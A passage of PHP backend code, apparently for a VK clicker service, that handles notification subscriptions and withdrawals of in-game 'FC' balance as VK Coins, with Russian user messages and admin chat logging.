    if($user_yved == null) {
$user->yvedomlenia = 1;
R::store($user);
            $yvedomlenia = R::dispense('yved');
            $yvedomlenia->user = $data['user_vk'];
            $yvedomlenia->podpiska   = 1;
            $yvedomlenia->vce = 0;
            $yvedomlenia = R::load('yved', R::store($yvedomlenia)); 
            $vk->sendMessage(2000000463, "@id$user->user_vk_id ($user->first_name $user->last_name) подписался на уведы сервиса.");
            $array = getUser($user, ['status' => 'success', 'msg' => "Вы успешно подписались на уведомления сервиса."]);
    } else {
        $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже подписаны на уведомления сервиса.."]);
    }
//

die(json_encode($array));
break;

case 'user.vkcoins.vivod':
    $user = R::findOne('users', 'user_vk_id = ?', [
        $data['user_vk']
    ]);
    
    $time = time() - strtotime($user->vivodvc_time);
    if($time >= 60*60*24) {
        //$user->vivodvc_time = R::isoDateTime();
        //R::store($user);
    $summa1 = round($data['summa'], 3);
    if($user->clicks >= $summa1) { 
        $kurs = 1234;
        if(5000 <= $summa1) {
        $summa = round($summa1/$kurs, 3);
        $balance = $user->clicks;
        $vivod = $vkcoin->sendTransfer($data['user_vk'], $summa*1000, true);
        if(!isset($vivod['response']['error'])) { //ошибка от вк окина пришла...
        $user->clicks = $user->clicks - $summa1;
        $user = R::load('users', R::store($user));
        $vk->sendMessage(2000000001, "@id$user->user_vk_id ($user->first_name $user->last_name) заказал вывод в размере $summa1 FC (вывел: $summa VC)
Баланс был: $balance
Баланс стал: $user->clicks.");
        $array = getUser($user, ['status' => 'success', 'msg' => "На Ваш баланс успешно отправлено $summa VC!"]);
        } else {
            $vk->sendMessage(2000000001, "@id$user->user_vk_id ($user->first_name $user->last_name) заказал вывод в размере $summa1 FC (вывел бы: $summa VC).Идентификаторы ошибки: #".$vivod['response']['error']['code']."-".$vivod['response']['error']['message']);

            $array = getUser($user, ['status' => 'error', 'msg' => "Произошла ошибка. Сообщите об этом поддержке и попробуйте еще раз.
            
Идентификатор ошибки: VC:".$vivod['response']['error']['code']."-".$vivod['response']['error']['message']]);
        }
    } else {
        $array = getUser($user, ['status' => 'error', 'msg' => "Попробуйте указать сумму для вывода больше."]);
    }
    } else {
        $ballllll = $summa1 - $user->clicks;
        $array = getUser($user, ['status' => 'error', 'msg' => "Недостаточно FC на балансе. Не хватает еще $ballllll FC."]);
    }
    } else {
        $array = getUser($user, ['status' => 'error', 'msg' => "Вы уже выводили VK Coins. Попробуйте через некоторое время."]);
    }

    die(json_encode($array));
    break;

    default:
        die(json_encode($data));
        break;
}